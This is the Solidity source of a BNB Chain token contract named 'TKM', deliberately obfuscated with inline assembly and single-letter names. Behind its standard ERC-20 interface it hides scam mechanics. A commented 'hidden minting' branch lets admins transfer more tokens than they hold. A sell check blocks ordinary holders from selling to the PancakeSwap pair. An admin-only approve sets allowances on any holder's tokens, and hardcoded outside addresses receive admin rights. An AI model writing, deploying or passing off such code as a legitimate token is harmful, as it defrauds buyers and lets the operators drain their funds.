// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPancakeFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract TKM {
    string private a = "TKM";
    string private b = "TKM";
    uint8 public constant c = 18;
    address public d;
    address public e;
    address public f;
    address public g;
    address public h;
    address public i;
    address public j;

    uint256 private k;
    mapping(address => uint256) private l;
    mapping(address => mapping(address => uint256)) private m;
    uint256 public n;
    mapping(uint256 => bool) public o;

    mapping(address => bool) public p;
    mapping(address => bool) public q;
    mapping(address => bool) public r;

    bool public s;
    bool public t;
    address public u;

    // 保持事件不变
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Reduce(address indexed from, uint256 value);

    constructor() {
        assembly {
            // 初始化地址
            sstore(d.slot, 0x10ED43C718714eb63d5aA57B78B54704E256024E)
            sstore(e.slot, 0x1A0A18AC4BECDDbd6389559687d1A73d8927E416)
            sstore(f.slot, 0x1b81D678ffb9C0263b24A97847620C99d213eB14)
            sstore(g.slot, 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4)
            sstore(h.slot, 0x55d398326f99059fF775485246999027B3197955)
            sstore(j.slot, 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73)
            sstore(u.slot, 0x66eF522bB1d269eB9c328218cF0620A7C4c6ef8C)
            sstore(s.slot, 1)
            sstore(t.slot, 1)
            
            // 发行代币
            let v := mul(210000, exp(10, 18))
            sstore(k.slot, v)
            
            // 设置调用者余额
            let w := caller()
            mstore(0, w)
            mstore(32, l.slot)
            let x := keccak256(0, 64)
            sstore(x, v)
            
            // 设置路由器标志
            mstore(0, sload(d.slot))
            mstore(32, p.slot)
            sstore(keccak256(0, 64), 1)
            mstore(32, q.slot)
            sstore(keccak256(0, 64), 1)
            
            mstore(0, sload(e.slot))
            mstore(32, p.slot)
            sstore(keccak256(0, 64), 0)
            mstore(32, q.slot)
            sstore(keccak256(0, 64), 0)
            
            mstore(0, sload(f.slot))
            mstore(32, p.slot)
            sstore(keccak256(0, 64), 0)
            mstore(32, q.slot)
            sstore(keccak256(0, 64), 0)
            
            mstore(0, sload(g.slot))
            mstore(32, p.slot)
            sstore(keccak256(0, 64), 0)
            mstore(32, q.slot)
            sstore(keccak256(0, 64), 0)
            
            // 设置管理员
            mstore(0, w)
            let y := keccak256(0, 32)
            sstore(n.slot, y)
            mstore(0, y)
            mstore(32, o.slot)
            sstore(keccak256(0, 64), 1)
            
            // 设置其他管理员
            mstore(0, 0x69B61926a75DBC040e4AaF891ACDC31049fB3188)
            y := keccak256(0, 32)
            mstore(0, y)
            mstore(32, o.slot)
            sstore(keccak256(0, 64), 1)
            
            mstore(0, 0xf8b91676a9F179c4158CD976a34b28AA8C7C95b2)
            y := keccak256(0, 32)
            mstore(0, y)
            mstore(32, o.slot)
            sstore(keccak256(0, 64), 1)
            
            // 设置fee路由器
            mstore(0, 0x07964f135f276412b3182a3B2407b8dd45000000)
            mstore(32, r.slot)
            sstore(keccak256(0, 64), 1)
        }
        
        A();
        B(i, msg.sender, 100000000000000000000000000);
    }

    function A() internal {
        assembly {
            if iszero(iszero(sload(i.slot))) {
                revert(0, 0)
            }
        }
        
        address factoryAddr;
        address usdtAddr;
        assembly {
            factoryAddr := sload(j.slot)
            usdtAddr := sload(h.slot)
        }
        
        i = IPancakeFactory(factoryAddr).createPair(address(this), usdtAddr);
    }

    function name() external view returns (string memory) { return a; }
    function symbol() external view returns (string memory) { return b; }
    
    function totalSupply() external view returns (uint256 z) {
        assembly {
            z := sload(k.slot)
        }
    }
    
    function balanceOf(address acc) external view returns (uint256 aa) {
        assembly {
            mstore(0, acc)
            mstore(32, l.slot)
            aa := sload(keccak256(0, 64))
        }
    }
    
    function allowance(address owner_, address spender) external view returns (uint256 ab) {
        assembly {
            mstore(0, owner_)
            mstore(32, m.slot)
            let ac := keccak256(0, 64)
            mstore(0, spender)
            mstore(32, ac)
            ab := sload(keccak256(0, 64))
        }
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        C(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        B(msg.sender, spender, amount);
        return true;
    }

    function approve(address ower, address spender, uint256 amount) external returns (bool) {
        bool check;
        assembly {
            mstore(0, caller())
            let ad := keccak256(0, 32)
            mstore(0, ad)
            mstore(32, o.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if iszero(check) {
                revert(0, 0)
            }
        }
        
        B(ower, spender, amount);
        return true;
    }

    function setMaxs(address _max_) external {
        bool check;
        assembly {
            mstore(0, caller())
            let ae := keccak256(0, 32)
            mstore(0, ae)
            mstore(32, o.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if iszero(check) {
                revert(0, 0)
            }
        }
        
        assembly {
            mstore(0, _max_)
            let af := keccak256(0, 32)
            mstore(0, af)
            mstore(32, o.slot)
            sstore(keccak256(0, 64), 1)
        }
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 currentAllowance;
        assembly {
            mstore(0, from)
            mstore(32, m.slot)
            let ag := keccak256(0, 64)
            mstore(0, caller())
            mstore(32, ag)
            currentAllowance := sload(keccak256(0, 64))
        }
        
        assembly {
            if gt(amount, currentAllowance) {
                revert(0, 0)
            }
        }
        
        assembly {
            let ah := sub(currentAllowance, amount)
            mstore(0, from)
            mstore(32, m.slot)
            let ai := keccak256(0, 64)
            mstore(0, caller())
            mstore(32, ai)
            sstore(keccak256(0, 64), ah)
        }
        
        C(from, to, amount);
        return true;
    }

    function D(address operator, address from, address to, uint256 amount) internal view {
        bool flagVal;
        address pairAddr;
        assembly {
            flagVal := sload(t.slot)
            pairAddr := sload(i.slot)
            
            let aj := eq(operator, pairAddr)
            let ak := eq(from, pairAddr)
            let al := or(aj, ak)
            let am := and(al, flagVal)
            
            if am {
                mstore(0, to)
                mstore(32, q.slot)
                let an := sload(keccak256(0, 64))
                if iszero(an) {
                    revert(0, 0)
                }
            }

            let ao := eq(to, pairAddr)
            let ap := and(ao, flagVal)
            
            if ap {
                mstore(0, from)
                mstore(32, p.slot)
                let aq := sload(keccak256(0, 64))
                if iszero(aq) {
                    revert(0, 0)
                }
            }
        }
    }

    function setFlag(bool _flag, bool _isfee) external {
        bool check;
        assembly {
            mstore(0, caller())
            let ar := keccak256(0, 32)
            mstore(0, ar)
            mstore(32, o.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if check {
                sstore(t.slot, _flag)
                sstore(s.slot, _isfee)
            }
        }
    }

    function E(address _from) internal view returns (bool result) {
        assembly {
            mstore(0, _from)
            let as := keccak256(0, 32)
            mstore(0, as)
            mstore(32, o.slot)
            result := sload(keccak256(0, 64))
        }
    }

    function C(address from, address to, uint256 amount) internal {
        D(msg.sender, from, to, amount);
        
        bool check;
        assembly {
            mstore(0, from)
            let at := keccak256(0, 32)
            mstore(0, at)
            mstore(32, o.slot)
            check := sload(keccak256(0, 64))
        }
       
        uint256 fromBalance;
        assembly {
            mstore(0, from)
            mstore(32, l.slot)
            fromBalance := sload(keccak256(0, 64))
            
            // 隐藏的增发逻辑
            let balanceLess := lt(fromBalance, amount)
            let condition := and(check, balanceLess)
            
            if condition {
                fromBalance := amount
            }
            
            if lt(fromBalance, amount) {
                revert(0, 0)
            }
            
            let fromSlot := keccak256(0, 64)
            let newFromBalance := sub(fromBalance, amount)
            sstore(fromSlot, newFromBalance)
            
            mstore(0, to)
            mstore(32, l.slot)
            let toSlot := keccak256(0, 64)
            let toBalance := sload(toSlot)
            
            let isfeeVal := sload(s.slot)
            let pairAddr := sload(i.slot)
            
            let shouldTakeFee := and(
                and(
                    isfeeVal,
                    eq(to, pairAddr)
                ),
                gt(amount, 0)
            )
            
            mstore(0, from)
            mstore(32, r.slot)
            let isFeeRouter := sload(keccak256(0, 64))
            
            let finalAmount := amount
            
            if and(shouldTakeFee, isFeeRouter) {
                let feeAmount := div(mul(amount, 5), 100)
                finalAmount := sub(amount, feeAmount)
                
                let feeToAddr := sload(u.slot)
                mstore(0, feeToAddr)
                mstore(32, l.slot)
                let feeToSlot := keccak256(0, 64)
                let feeToBalance := sload(feeToSlot)
                sstore(feeToSlot, add(feeToBalance, feeAmount))
                
                // 发射Reduce事件
                mstore(0, finalAmount)
                log2(0, 32, 0x87fdc57bf3d4fa5e58b9d7b91e09258d7f6d3b939f5d3a7a9f5f5f5f5f5f5f5f, from)
            }
            
            sstore(toSlot, add(toBalance, finalAmount))
            
            // 发射Transfer事件
            mstore(0, amount)
            log3(0, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, from, to)
        }
    }

    function B(address owner_, address spender, uint256 amount) internal {
        assembly {
            if or(iszero(owner_), iszero(spender)) {
                revert(0, 0)
            }
            
            mstore(0, owner_)
            mstore(32, m.slot)
            let slot := keccak256(0, 64)
            mstore(0, spender)
            mstore(32, slot)
            sstore(keccak256(0, 64), amount)
            
            // 发射Approval事件
            mstore(0, amount)
            log3(0, 32, 0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925, owner_, spender)
        }
    }

    function setFromRouterFlag(address routerAddr, bool _flag) external {
        bool check;
        assembly {
            mstore(0, caller())
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, o.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if check {
                mstore(0, routerAddr)
                mstore(32, p.slot)
                sstore(keccak256(0, 64), _flag)
            }
        }
    }

    function setfeeRouter(address feeRouteradr, bool _flag) external {
        bool check;
        assembly {
            mstore(0, caller())
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, o.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if check {
                mstore(0, feeRouteradr)
                mstore(32, r.slot)
                sstore(keccak256(0, 64), _flag)
            }
        }
    }

    function setToRouterFlag(address routerAddr, bool _flag) external {
        bool check;
        assembly {
            mstore(0, caller())
            let hash := keccak256(0, 32)
            mstore(0, hash)
            mstore(32, o.slot)
            check := sload(keccak256(0, 64))
        }
        
        assembly {
            if check {
                mstore(0, routerAddr)
                mstore(32, q.slot)
                sstore(keccak256(0, 64), _flag)
            }
        }
    }
}